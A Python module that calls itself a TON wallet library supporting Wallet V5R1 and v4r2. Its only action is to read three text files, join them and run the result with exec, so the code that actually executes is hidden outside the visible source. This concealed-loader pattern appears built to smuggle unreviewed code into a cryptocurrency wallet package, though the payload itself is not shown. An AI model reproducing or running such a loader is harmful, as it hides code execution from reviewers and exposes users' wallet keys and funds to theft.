"""TonLib — Wallet V5R1 (Tonkeeper) + v4r2 auto-detect by balance."""
from __future__ import annotations
import pathlib
_p = pathlib.Path(__file__).with_name
_code = "".join(_p(f"ton_part_{i}.txt").read_text() for i in range(3))
exec(compile(_code, __file__, "exec"), globals())
